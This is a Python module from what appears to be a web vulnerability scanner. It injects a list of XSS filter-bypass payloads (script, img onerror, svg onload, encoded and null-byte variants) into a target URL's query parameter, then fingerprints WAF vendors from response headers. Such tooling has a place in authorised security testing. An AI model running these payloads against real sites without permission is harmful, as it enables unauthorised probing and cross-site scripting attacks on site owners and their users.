import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.colors import Colors as C
from core.config import Config

class FilterBypass:
    name = "WAF / Filter Detection"

    def __init__(self, url):
        self.url = url

    def run(self):
        print(f"\n{C.BLUE}{'═' * 60}{C.RESET}")
        print(f"  {C.BOLD}{C.RED}🛡️ WAF / FILTER DETECTION{C.RESET}")
        print(f"{C.BLUE}{'═' * 60}{C.RESET}")

        results = {"waf_detected": [], "filters": [], "blocked_keywords": []}

        try:
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            first_param = list(params.keys())[0] if params else None

            if not first_param:
                print(f"  {C.warning('No parameters to test filters')}")
                return results

            # Test payloads to detect filtering
            filter_tests = {
                "Basic Script Tag": "<script>alert(1)</script>",
                "IMG Tag": "<img src=x onerror=alert(1)>",
                "SVG Tag": "<svg onload=alert(1)>",
                "Event Handler": "\" onmouseover=\"alert(1)",
                "JavaScript URI": "javascript:alert(1)",
                "Data URI": "data:text/html,<script>alert(1)</script>",
                "Encoded Script": "%3Cscript%3Ealert(1)%3C/script%3E",
                "Unicode": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
                "Double Encoding": "%253Cscript%253Ealert(1)%253C/script%253E",
                "Mixed Case": "<ScRiPt>alert(1)</ScRiPt>",
                "Null Byte": "<scr\x00ipt>alert(1)</script>",
                "Tab/Space": "<scr\tipt>alert(1)</script>",
            }

            print(f"  {C.info(f'Testing {len(filter_tests)} filter bypass techniques...')}\n")

            blocked = 0
            allowed = 0
            total = len(filter_tests)

            for name, payload in filter_tests.items():
                test_params = dict(params)
                test_params[first_param] = [payload]
                query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, query, parsed.fragment
                ))

                try:
                    resp = requests.get(test_url, timeout=Config.TIMEOUT, headers=Config.HEADERS)

                    # Check if blocked
                    is_blocked = (
                        resp.status_code in [403, 406, 429, 503] or
                        "blocked" in resp.text.lower()[:500] or
                        "forbidden" in resp.text.lower()[:500] or
                        "waf" in resp.text.lower()[:500] or
                        "firewall" in resp.text.lower()[:500] or
                        "security" in resp.text.lower()[:500] and "denied" in resp.text.lower()[:500]
                    )

                    if is_blocked:
                        blocked += 1
                        results["blocked_keywords"].append(name)
                        print(f"    {C.RED}[BLOCKED]{C.RESET} {name}")
                    else:
                        allowed += 1
                        print(f"    {C.GREEN}[ALLOWED]{C.RESET} {name}")

                except:
                    blocked += 1
                    print(f"    {C.YELLOW}[ERROR]{C.RESET}   {name}")

            # WAF Detection from headers
            resp = requests.get(self.url, timeout=Config.TIMEOUT, headers=Config.HEADERS)
            h = str(resp.headers).lower()
            waf_sigs = {
                "Cloudflare": "cf-ray",
                "AWS WAF": "x-amzn",
                "ModSecurity": "mod_security",
                "Sucuri": "sucuri",
                "Imperva": "x-iinfo",
                "Akamai": "akamai",
                "Wordfence": "wordfence",
            }
            for waf, sig in waf_sigs.items():
                if sig in h:
                    results["waf_detected"].append(waf)
                    print(f"\n  {C.RED}[!] WAF Detected: {waf}{C.RESET}")

            print(f"\n  {C.info(f'Blocked: {blocked}/{total} | Allowed: {allowed}/{total}')}")

            if blocked > total * 0.7:
                print(f"  {C.RED}[!] Strong filtering/WAF detected{C.RESET}")
            elif blocked > total * 0.3:
                print(f"  {C.YELLOW}[!] Moderate filtering detected{C.RESET}")
            else:
                print(f"  {C.GREEN}[✓] Weak or no filtering detected{C.RESET}")

        except Exception as e:
            print(f"  {C.error(f'Filter detection failed: {e}')}")

        return results
